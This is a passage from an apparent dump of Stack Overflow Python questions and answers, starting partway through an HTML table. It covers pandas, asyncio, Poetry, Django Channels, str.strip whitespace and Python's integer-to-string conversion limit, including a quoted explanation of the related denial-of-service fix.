TDs&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;50&lt;/td&gt;&lt;td&gt;Touchdowns&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;450&lt;/td&gt;&lt;td&gt;1800&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 3 TDs&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;75&lt;/td&gt;&lt;td&gt;Touchdowns&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;300&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;300&lt;/td&gt;&lt;td&gt;1200&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 4 TDs&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;100&lt;/td&gt;&lt;td&gt;Touchdowns&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;400&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;800&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 5+ TDs&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;300&lt;/td&gt;&lt;td&gt;Touchdowns&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;10000&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1200&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;30-39 Completions&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;50&lt;/td&gt;&lt;td&gt;PassingCompletions&lt;/td&gt;&lt;td&gt;30&lt;/td&gt;&lt;td&gt;39&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;250&lt;/td&gt;&lt;td&gt;1000&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;40+ Completions&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;PassingCompletions&lt;/td&gt;&lt;td&gt;40&lt;/td&gt;&lt;td&gt;9999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;800&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;800&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0 INTs (must have been designated starter)&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;PassingInterceptions&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;800&lt;/td&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;1400&lt;/td&gt;&lt;td&gt;5600&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3500-3999 Passing YDs&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;500&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;3500&lt;/td&gt;&lt;td&gt;3999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4000-4999 Passing YDS&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;750&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;4000&lt;/td&gt;&lt;td&gt;4999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5000+ Passing YDS&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;1250&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;5000&lt;/td&gt;&lt;td&gt;99999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;5000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;30-39 Passing TDS&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;750&lt;/td&gt;&lt;td&gt;PassingTouchdowns&lt;/td&gt;&lt;td&gt;30&lt;/td&gt;&lt;td&gt;39&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;40-45 Passing TDS&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;1250&lt;/td&gt;&lt;td&gt;PassingTouchdowns&lt;/td&gt;&lt;td&gt;40&lt;/td&gt;&lt;td&gt;49&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;5000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;50+ Passing TDS&lt;/td&gt;&lt;td&gt;Season&lt;/td&gt;&lt;td&gt;2000&lt;/td&gt;&lt;td&gt;PassingTouchdowns&lt;/td&gt;&lt;td&gt;50&lt;/td&gt;&lt;td&gt;99999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;8000&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</code></pre>
</div>
</div>
</p>
<p>What I want to do is analyze the Records of the Season Wise Records and the Game Wise Records, and based upon the <code>Goals given</code> in the Player Goals File, I want to add the <strong>Reward</strong> for all the players.</p>
<p>This is player position dependent so I made the following function to calculate Rewards for all the players (for the Season Records only)</p>
<pre><code>def calculatePointsSeason(target, min_value, games_played_condition, max_value, tier_position, player_position, reward, games_played):
    if player_position in positions[tier_position]:
        if games_played &gt; games_played_condition:
            if target &gt;= min_value and target &lt;= max_value:
                return reward 
    return 0 
</code></pre>
<p>Similarly, I made this function to calculate Game wise Record,</p>
<pre><code>def calculatePointsGame(target, min_value, max_value, tier_position, player_position, reward, started, started_condition):
    if player_position in positions[tier_position]:
        if started == started_condition:
            if target &gt;= min_value and target &lt;= max_value:
                return reward 
    return 0 
</code></pre>
<p>Following is the function in which I am applying these two functions to calculate the Reward for each player,</p>
<pre><code>for key, value in positions.items(): # Positions has a list of all the positions 
    for (idx, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position
        if row['Goal Type'] == 'Season':
            df = df.copy(deep=True) # df contains the Season Wise Record Dataframe
            df['Reward'] += df.apply(lambda x: calculatePointsSeason(x[row['Target']], row['Min Value'], row['Games Required'],
                                                               row['Max Value'], key, x['Position'],
                                                                row['PCC Reward'], x['Games Played']), axis=1)
        else: # For Game wise points
            for (i, main_player) in df.iterrows():
                for (j, game_player) in data.iterrows(): # data contains the Game Wise Record dataframe
                    if main_player['Name'] == game_player['Name']:
                        main_player['Reward'] += calculatePointsGame(main_player[row['Target']], 
                                                                    row['Min Value'], row['Max Value'], 
                                                                    key, main_player['Position'], row['PCC Reward'], 
                                                                    game_player['Starter'], row['Started'])
</code></pre>
<p>This function works well for the <code>Season Wise Records</code>, but for the <code>Game Wise</code>, I couldn't come up with any Pandas way to do it (eliminating the need of iteration of two Dataframes). I want some way to,</p>
<ul>
<li><p>Match the Rows given in the <code>Game Wise Record</code> file with the <code>Season Wise Record</code> file, <strong>based upon the Name attribute</strong></p>
</li>
<li><p>Send the Values from the <code>Game Wise Record</code> to the Custom Function and the <code>Position</code> of the player from the <code>Season Wise Record</code> (so that, only the specific reward is calculated for the player, e.g. if player is QB, so only QB Rewards will be match with him and etc. There are Excel Sheets for each position rewards)</p>
</li>
<li><p>Get the Reward Value back and add it to the <code>Reward</code> in the <code>Season Wise Record</code> against that specific player record.</p>
</li>
</ul>
<p>I previously tried to do it by comparing the Name of the Player in the Season Wise Record with the Game Wise Record, but it didn't work. Is there any Pandas way to solve this issue? (where you don't have to iterate all the rows two times)</p>
","73819986","<p>I hope I understood correctly your intentions. To avoid double <code>for</code> loops, you need to use <code>groupby()</code> method and then apply the desired function to every row of the group; finally the aggregation function (<code>sum()</code>) should be applied to the group. Although you can use the <code>Name</code> as a key for grouping, I recommend to add <code>PlayerID</code>.</p>
<p>The approach needs little preparation:</p>
<pre><code>data = data.join(
    df.reset_index().set_index(['Name', 'Team'], drop=False)[['index','Position']],
    on=['Name','Team'],
    how='left'
).rename({'index':'PlayerID'}, axis=1)
</code></pre>
<p>We add 2 columns to <code>data</code> DataFrame, namely <code>Position</code> and <code>PlayerID</code> which is the index of the first DataFrame <code>df</code>. We search for the ID checking <code>Name</code> and <code>Team</code> that still may cause a collision (when there 2 players with identical name in the same team).</p>
<p>When it's done the last part of the code will be like this:</p>
<pre><code>for key, value in positions.items(): # Positions has a list of all the positions 
    for (_, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position
        if row['Goal Type'] == 'Season':
            if row['Target'] in df.columns:
                df['Reward'] += df.apply(lambda x: calculatePointsSeason(
                    x[row['Target']], row['Min Value'], row['Games Required'],
                    row['Max Value'], key, x['Position'],
                    row['PCC Reward'], x['Games Played']
                ), axis=1)
        else: # For Game wise points
            if row['Target'] in data.columns: # I added these 2 checks because sometimes target is not presented in the columns which raises the error
                df['Reward'] = df['Reward'].add(
                    data.groupby('PlayerID').apply(
                        lambda group: group.apply(lambda game_player: calculatePointsGame(
                            game_player[row['Target']], 
                            row['Min Value'], row['Max Value'], 
                            key, game_player['Position'],
                            row['PCC Reward'], 
                            game_player['Starter'],
                            row['Started']
                        ), axis=1).sum()
                    ),
                    fill_value=0
                )
</code></pre>
"
"73876937","1","What is the difference between keyword pass and ... in python?","<p>Is there any significant difference between the two Python keywords (...) and (pass) like in the examples</p>
<pre><code>def tempFunction():
    pass 
</code></pre>
<p>and</p>
<pre><code>def tempFunction():
    ...
</code></pre>
<p>I should be aware of?</p>
","73877007","<p>The <code>...</code> is the shorthand for the <code>Ellipsis</code> global object in python. Similar to <code>None</code> and <code>NotImplemented</code> it can be used as a marker value to indicate the absence of something.</p>
<p>For example:</p>
<pre class=""lang-py prettyprint-override""><code>print(...)
# Prints &quot;Ellipsis&quot;
</code></pre>
<p>In this case, it has no effect. You could put any constant there and it would do the same. This is valid:</p>
<pre><code>def function():
    1
</code></pre>
<p>Or</p>
<pre><code>def function():
    'this function does nothing'
</code></pre>
<p>Note both do nothing and return <code>None</code>. Since there is no return keyword the value won't be returned.</p>
<p><code>pass</code> explicitly does nothing, so it will have the same effect in this case too.</p>
"
"73597456","1","What is the python-poetry config file after 1.2.0 release?","<p>I have been using <a href=""https://python-poetry.org/"" rel=""noreferrer"">python-poetry</a> for over a year now. <br/>
After <a href=""https://github.com/python-poetry/poetry/releases/tag/1.2.0"" rel=""noreferrer"">poetry 1.2.0</a> release, I get such an info warning:</p>
<pre><code>Configuration file exists at ~/Library/Application Support/pypoetry,
reusing this directory.

Consider moving configuration to ~/Library/Preferences/pypoetry,
as support for the legacy directory will be removed in an upcoming release.
</code></pre>
<p>But in docs, it is still indicated for macOS: <code>~/Library/Application Support/pypoetry</code> <br/>
<a href=""https://python-poetry.org/docs/configuration/"" rel=""noreferrer"">https://python-poetry.org/docs/configuration/</a></p>
<p>My question is that if <code>~/Library/Preferences/pypoetry</code> is the latest decision what should I do for moving configuration to there? <br/>
Is just copy-pasting enough?</p>
<p><a href=""https://python-poetry.org/docs/configuration/"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/54tHz.png"" alt=""poetry-config-file-for-macos"" /></a></p>
","73632457","<p>Looks like it is as simple as copy/pasting to the new directory.</p>
<p>I got the same error after upgrading to Poetry 1.2.  So I created a <code>pypoetry</code> folder in the new <code>Preferences</code> directory, copy/pasted the <code>config.toml</code> to it, and just to be safe, I renamed the original folder to:</p>
<p><code>~/Library/Application Support/pypoetry_bak</code></p>
<p>After doing this and running <code>poetry -V</code>, the error is gone.</p>
"
"74586892","1","No module named 'keras.saving.hdf5_format'","<p>After <code>pip3 install</code>ing <code>tensorflow</code> and the <code>transformers</code> library, I'm receiving the titular error when I try loading <a href=""https://huggingface.co/bhadresh-savani/distilbert-base-uncased-emotion"" rel=""noreferrer"">this</a></p>
<pre class=""lang-py prettyprint-override""><code>from transformers import pipeline
classifier = pipeline(&quot;text-classification&quot;,model='bhadresh-savani/distilbert-base-uncased-emotion')
</code></pre>
<p>The error traceback looks like:</p>
<pre class=""lang-bash prettyprint-override""><code>RuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):
No module named 'keras.saving.hdf5_format'

</code></pre>
<p>I have ensured keras got installed with transformers, so I'm not sure why it isn't working</p>
","74588082","<p>If you are using the latest version of TensorFlow and Keras then you have to try this code and you have got this error as shown below</p>
<pre><code>RuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):
No module named 'keras.saving.hdf5_format'
</code></pre>
<p>Now, expand this error traces as I have shown below</p>
<p><a href=""https://i.stack.imgur.com/vJyXg.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/vJyXg.png"" alt=""Click on the 14 frames"" /></a></p>
<p>Now click on the 14 frames and select as shown below
<a href=""https://i.stack.imgur.com/2gnkZ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/2gnkZ.png"" alt=""Click on modeling_tf_utils.py"" /></a>
Now comment this line as shown in the picture below
<a href=""https://i.stack.imgur.com/Fx40A.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Fx40A.png"" alt=""Comment this from keras.saving.hdf5_format import save_attributes_to_hdf5_group"" /></a></p>
<p>Now, try this and your error will gone.</p>
<p>The problem is that this is in the older version of keras and you are using the latest version of keras. So, you can skip all these steps and go back to the older version and it will work eventually.</p>
"
"73661082","1","How to generate a certain number of random whole numbers that add up to a certain number and are at least a certain number or more?","<p>I want to generate 10 whole numbers that add up to 40 and are in the range of 2-6.</p>
<p>For example:</p>
<p><code>2 + 6 + 2 + 5 + 6 + 2 + 2 + 6 + 3 + 6 = 40</code></p>
<p>Ten random numbers between 2 and 6 that add up to 40.</p>
","73661454","<p>My idea is to generate numbers in the range of [2,6] until the length of the list is 10 then start checking the sum, if it's not 40 then remove the first element of the list and generate a new number. The only problem is that you might need to check if it's even possible to sum the numbers to your target number, for example it can never reach the target number if it's odd but all the generated numbers are even.</p>
<pre><code>import random

low,high = 2,6
count = 10
target = 40

k = []
r = range(low,high+1)
tries = 0
while True:
    k.append(random.choice(r))
    if len(k) == count:
        if sum(k) == target:
            break
        k = k[1:]
        tries += 1
        
print(k)
print(len(k))
print(sum(k))
print(tries)
</code></pre>
"
"73661849","1","Which specific characters does the strip function remove?","<p>Here is what you can find in the <a href=""https://docs.python.org/3/library/stdtypes.html#str.strip"" rel=""noreferrer""><code>str.strip</code> documentation</a>:</p>
<blockquote>
<p>The <em>chars</em> argument is a string specifying the set of characters to be removed. If omitted or <code>None</code>, the <em>chars</em> argument defaults to removing whitespace.</p>
</blockquote>
<p>Now my question is: which specific characters are considered whitespace?</p>
<p>These function calls share the same result:</p>
<pre><code>&gt;&gt;&gt; ' '.strip()
''
&gt;&gt;&gt; '\n'.strip()
''
&gt;&gt;&gt; '\r'.strip()
''
&gt;&gt;&gt; '\v'.strip()
''
&gt;&gt;&gt; '\x1e'.strip()
''
</code></pre>
<p>In <a href=""https://stackoverflow.com/questions/22230080/strip-and-stripstring-whitespace-give-different-results-despite-documentatio"">this</a> related question, a user mentioned that the <code>str.strip</code> function works with a <em>superset</em> of ASCII whitespace characters (in other words, a superset of <code>string.whitespace</code>). More specifically, it works with all unicode whitespace characters.</p>
<p>Moreover, I <em>believe</em> (but I'm just guessing, I have no proofs) that <code>c.isspace()</code> returns <code>True</code> for each character <em>c</em> that would also be removed by <code>str.strip</code>. Is that correct? If so, I guess one could just run <code>c.isspace()</code> for each unicode character <em>c</em>, and come up with a list of whitespace characters that are removed by default by <code>str.strip</code>.</p>
<pre><code>&gt;&gt;&gt; ' '.isspace()
True
&gt;&gt;&gt; '\n'.isspace()
True
&gt;&gt;&gt; '\r'.isspace()
True
&gt;&gt;&gt; '\v'.isspace()
True
&gt;&gt;&gt; '\x1e'.isspace()
True
</code></pre>
<p>Is my assumption correct? And if so, how can I find some proofs? Is there an easier way to know which specific characters are automatically removed by <code>str.strip</code>?</p>
","73664219","<p>The most trivial way to know which characters are removed by <code>str.strip()</code> is to loop over each possible characters and check if a string containing such character gets altered by <code>str.strip()</code>:</p>
<pre><code>c = 0
while True:
  try:
    s = chr(c)
  except ValueError:
    break
  if (s != s.strip()):
    print(f&quot;{hex(c)} is stripped&quot;, flush=True)
  c+=1
</code></pre>
<p>As suggested in the comments, you may also print a table to check if <code>str.strip()</code>, <code>str.split()</code> and <code>str.isspace()</code> share the same behaviour about white spaces:</p>
<pre><code>c = 0
print(&quot;char\tstrip\tsplit\tisspace&quot;)
while True:
  try:
    s = chr(c)
  except ValueError:
    break
  stripped = s != s.strip()
  splitted = not s.split()
  spaced = s.isspace()
  if (stripped or splitted or spaced):
    print(f&quot;{hex(c)}\t{stripped}\t{splitted}\t{spaced}&quot;, flush=True)
  c+=1
</code></pre>
<p>If I run the code above I get:</p>
<pre><code>char    strip   split   isspace
0x9     True    True    True
0xa     True    True    True
0xb     True    True    True
0xc     True    True    True
0xd     True    True    True
0x1c    True    True    True
0x1d    True    True    True
0x1e    True    True    True
0x1f    True    True    True
0x20    True    True    True
0x85    True    True    True
0xa0    True    True    True
0x1680  True    True    True
0x2000  True    True    True
0x2001  True    True    True
0x2002  True    True    True
0x2003  True    True    True
0x2004  True    True    True
0x2005  True    True    True
0x2006  True    True    True
0x2007  True    True    True
0x2008  True    True    True
0x2009  True    True    True
0x200a  True    True    True
0x2028  True    True    True
0x2029  True    True    True
0x202f  True    True    True
0x205f  True    True    True
0x3000  True    True    True
</code></pre>
<p>So, at least in python 3.10.4, your assumption seems to be correct.</p>
"
"73975798","1","Why does asyncio.wait keep a task with a reference around despite exceeding the timeout?","<p>I recently found and reproduced a memory leak caused by the use of <a href=""https://docs.python.org/3/library/asyncio-task.html#asyncio.wait"" rel=""noreferrer"">asyncio.wait</a>. Specifically, my program periodically executes some function until <code>stop_event</code> is set. I simplified my program to the snippet below (with a reduced timeout to demonstrate the issue better):</p>
<pre><code>async def main():
  stop_event = asyncio.Event()

  while True:
    # Do stuff here
    await asyncio.wait([stop_event.wait()], timeout=0.0001)

asyncio.run(main())
</code></pre>
<p>While this looked innocuous to me, it turns out there's a memory leak here. If you execute the code above, you'll see the memory usage growing to hundreds of MBs in a matter of minutes. This surprised me and took a long time to track down. I was expecting that after the timeout, anything I was waiting for would be cleaned up (since I'm not keeping any references to it myself). However, that turns out not to be the case.</p>
<p>Using <a href=""https://docs.python.org/3/library/gc.html#gc.get_referrers"" rel=""noreferrer"">gc.get_referrers</a>, I was able to infer that every time I call <code>asyncio.wait(...)</code>, a new task is created that holds a reference to the object returned by <code>stop_event.wait()</code> and that task is kept around forever. Specifically, <code>len(asyncio.all_tasks())</code> keeps increasing over time. Even if the timeout is passed, the tasks are still there. Only upon calling <code>stop_event.set()</code> do these tasks all finish at once and does memory usage decrease drastically.</p>
<p>After discovering that, this note in the documentation made me try <a href=""https://docs.python.org/3/library/asyncio-task.html#asyncio.wait_for"" rel=""noreferrer"">asyncio.wait_for</a> instead:</p>
<blockquote>
<p>Unlike wait_for(), wait() does not cancel the futures when a timeout occurs.</p>
</blockquote>
<p>It turns out that actually behaves like I expected. There are no references kept after the timeout, and memory usage and number of tasks stay flat. This is the code without a memory leak:</p>
<pre><code>async def main():
  stop_event = asyncio.Event()

  while True:
    # Do stuff here
    try:
      await asyncio.wait_for(event.stop_event(), timeout=0.0001)
    except asyncio.TimeoutError:
      pass

asyncio.run(main())
</code></pre>
<p>While I'm happy this is fixed now, I don't really understand this behavior. If the timeout has been exceeded, why keep this task holding a reference around? It seems like that's a recipe for creating memory leaks. The note about not cancelling futures is also not clear to me. What if we don't explicitly cancel the future, but we just don't keep a task holding a reference after the timeout? Wouldn't that work as well?</p>
<p>It would be very much appreciated if anybody could shine some light on this. Thanks a lot!</p>
","74003884","<p>The key concept to understand here is that the return value of <code>wait()</code> is a tuple <code>(completed, pending)</code> tasks.</p>
<p>The typical way to use <code>wait()</code>-based code is like this:</p>
<pre><code>async def main():
    stop_event = asyncio.Event()

    pending = [... add things to wait ...]

    while pending:
        completed, pending = await asyncio.wait(pending, timeout=0.0001)

        process(completed) # e.g. update progress bar

        pending.extend(more_tasks_to_wait)
</code></pre>
<p><code>wait()</code> with timeout isn't used to have one coroutine to wait for another coroutines/tasks to finish, instead its primary use case is for periodically flushing completed tasks, while letting the unfinished tasks to continue &quot;in the background&quot;, so cancelling the unfinished tasks automatically isn't really desirable, because you usually want to continue waiting for those pending tasks again in the next iteration.</p>
<p>This usage pattern resembles the <code>select()</code> system call.</p>
<p>On the other hand, the usage pattern of <code>await wait_for(xyz, )</code> is basically just like doing <code>await xyz</code> with a timeout. It's a common and much simpler use case.</p>
"
"74091600","1","ASGI_APPLICATION not working with Django Channels","<p>I followed the tutorial in the channels documentation but when I start the server <code>python3 manage.py runserver</code> it gives me this :</p>
<pre><code>Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
October 17, 2022 - 00:13:21
Django version 4.1.2, using settings 'config.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.
</code></pre>
<p>when I expected for it to give me this :</p>
<pre><code>Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
October 17, 2022 - 00:13:21
Django version 4.1.2, using settings 'config.settings'
Starting ASGI/Channels version 3.0.5 development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.
</code></pre>
<p><strong>settings.py</strong></p>
<pre><code>INSTALLED_APPS = [
    'channels',
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    ...
]

ASGI_APPLICATION = 'config.asgi.application'
</code></pre>
<p><strong>asgi.py</strong></p>
<pre><code>import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')

application = ProtocolTypeRouter({
    'http': get_asgi_application(),
})
</code></pre>
<p>It doesn't give any errors even when I change the <code>ASGI_APPLICATION = 'config.asgi.application</code> to <code>ASGI_APPLICATION = ''</code>.</p>
","74108598","<p>This could be due to the fact that the Django and channels versions you have used are not compatible
Try : <code>channels==3.0.4 and django==4.0.0</code></p>
"
"74599713","1","Merge two dictionaries in python","<p>I'm trying to merge two dictionaries based on key value. However, I'm not able to achieve it. Below is the way I tried solving.</p>
<pre><code>dict1 = {4: [741, 114, 306, 70],
         2: [77, 325, 505, 144],
         3: [937, 339, 612, 100],
         1: [52, 811, 1593, 350]}
dict2 = {1: 'A', 2: 'B', 3: 'C', 4: 'D'}
</code></pre>
<p>My resultant dictionary should be</p>
<pre><code>output = {'D': [741, 114, 306, 70],
          'B': [77, 325, 505, 144],
          'C': [937, 339, 612, 100],
          'A': [52, 811, 1593, 350]}
</code></pre>
<p>My code</p>
<pre><code>def mergeDictionary(dict_obj1, dict_obj2):
    dict_obj3 = {**dict_obj1, **dict_obj2}
    for key, value in dict_obj3.items():
        if key in dict_obj1 and key in dict_obj2:
               dict_obj3[key] = [value , dict_obj1[key]]
    return dict_obj3

dict_3 = mergeDictionary(dict1, dict2)
</code></pre>
<p>But I'm getting this as output</p>
<pre><code>dict_3={4: ['D', [741, 114, 306, 70]], 2: ['B', [77, 325, 505, 144]], 3: ['C', [937, 339, 612, 100]], 1: ['A', [52, 811, 1593, 350]]}
</code></pre>
","74599751","<p>Use a simple dictionary comprehension:</p>
<pre><code>output = {dict2[k]: v for k,v in dict1.items()}
</code></pre>
<p>Output:</p>
<pre><code>{'D': [741, 114, 306, 70],
 'B': [77, 325, 505, 144],
 'C': [937, 339, 612, 100],
 'A': [52, 811, 1593, 350]}
</code></pre>
"
"73693104","1","Python 3.10.7 - ValueError: Exceeds the limit (4300) for integer string conversion","<blockquote>
<pre><code>&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.set_int_max_str_digits(4300)  # Illustrative, this is the default.
&gt;&gt;&gt; _ = int('2' * 5432)
Traceback (most recent call last):
...
ValueError: Exceeds the limit (4300) for integer string conversion: value has 5432 digits.
</code></pre>
</blockquote>
<p>Python 3.10.7 introduced this breaking change for type conversion.</p>
<p>Documentation: <a href=""https://docs.python.org/3/library/stdtypes.html#integer-string-conversion-length-limitation"" rel=""noreferrer"">Integer string conversion length limitation</a></p>
<p>Actually I don't understand why</p>
<ol>
<li>this was introduced and</li>
<li>where does the default value of 4300 come from? Sounds like an arbitrary number.</li>
</ol>
","73693178","<p>See github issue <a href=""https://github.com/python/cpython/issues/95778"" rel=""noreferrer"">CVE-2020-10735: Prevent DoS by large int&lt;-&gt;str conversions #95778</a>:</p>
<blockquote>
<p><strong>Problem</strong></p>
<p>A Denial Of Service (DoS) issue was identified in CPython
because we use binary bignum’s for our int implementation. A huge
integer will always consume a near-quadratic amount of CPU time in
conversion to or from a base 10 (decimal) string with a large number
of digits. No efficient algorithm exists to do otherwise.</p>
<p>It is quite common for Python code implementing network protocols and
data serialization to do int(untrusted_string_or_bytes_value) on input
to get a numeric value, without having limited the input length or to
do <code>log(&quot;processing thing id %s&quot;, unknowingly_huge_integer)</code> or any
similar concept to convert an int to a string without first checking
its magnitude. (<code>http</code>, <code>json</code>, <code>xmlrpc</code>, <code>logging</code>, loading large values into
integer via linear-time conversions such as hexadecimal stored in
yaml, or anything computing larger values based on user controlled
inputs… which then wind up attempting to output as decimal later on).
All of these can suffer a CPU consuming DoS in the face of untrusted
data.</p>
<p>Everyone auditing all existing code for this, adding length guards,
and maintaining that practice everywhere is not feasible nor is it
what we deem the vast majority of our users want to do.</p>
<p>This issue has been reported to the Python Security Response Team
multiple times by a few different people since early 2020, most
recently a few weeks ago while I was in the middle of polishing up the
PR so it’d be ready before 3.11.0rc2.</p>
<p><strong>Mitigation</strong></p>
<p>After discussion on the Python Security Response Team
mailing list the conclusion was that we needed to limit the size of
integer to string conversions for non-linear time conversions
(anything not a power-of-2 base) by default. And offer the ability to
configure or disable this limit.</p>
<p>The Python Steering Council is aware of this change and accepts it as
necessary.</p>
</blockquote>
<p>Further discussion can be found on the Python Core Developers Discuss thread <a href=""https://discuss.python.org/t/int-str-conversions-broken-in-latest-python-bugfix-releases/18889"" rel=""noreferrer"">Int/str conversions broken in latest Python bugfix releases</a>.</p>
<p>I found <a href=""https://discuss.python.org/t/int-str-conversions-broken-in-latest-python-bugfix-releases/18889/2"" rel=""noreferrer"">this comment</a> by Steve Dower to be informative:</p>
<blockquote>
<p>Our apologies for the lack of transparency in the process here. The
issue was first reported to a number of other security teams, and
converged in the Python Security Response Team where we agreed that
the correct fix was to modify the runtime.</p>
<p>The delay between report and fix is entirely our fault. The security
team is made up of volunteers, our availability isn’t always reliable,
and there’s nobody “in charge” to coordinate work. We’ve been
discussing how to improve our processes. However, we did agree that
the potential for exploitation is high enough that we didn’t want to
disclose the issue without a fix available and ready for use.</p>
<p>We did work through a number of alternative approaches, implementing
many of them. The code doing int(gigabyte_long_untrusted_string) could
be anywhere inside a json.load or HTTP header parser, and can run very
deep. Parsing libraries are everywhere, and tend to use int
indiscriminately (though they usually handle ValueError already).
Expecting every library to add a new argument to every int() call
would have led to thousands of vulnerabilities being filed, and made
it impossible for users to ever trust that their systems could not be
DoS’d.</p>
<p>We agree it’s a heavy hammer to do it in the core, but it’s also the
only hammer that has a chance of giving users the confidence to keep
running Python at the boundary of their apps.</p>
<p>Now, I’m personally inclined to agree that int-&gt;str conversions should
do something other than raise. I was outvoted because it would break
round-tripping, which is a reasonable argument that I accepted. We can
still improve this over time and make it more usable. However, in most
cases we saw, rendering an excessively long string isn’t desirable
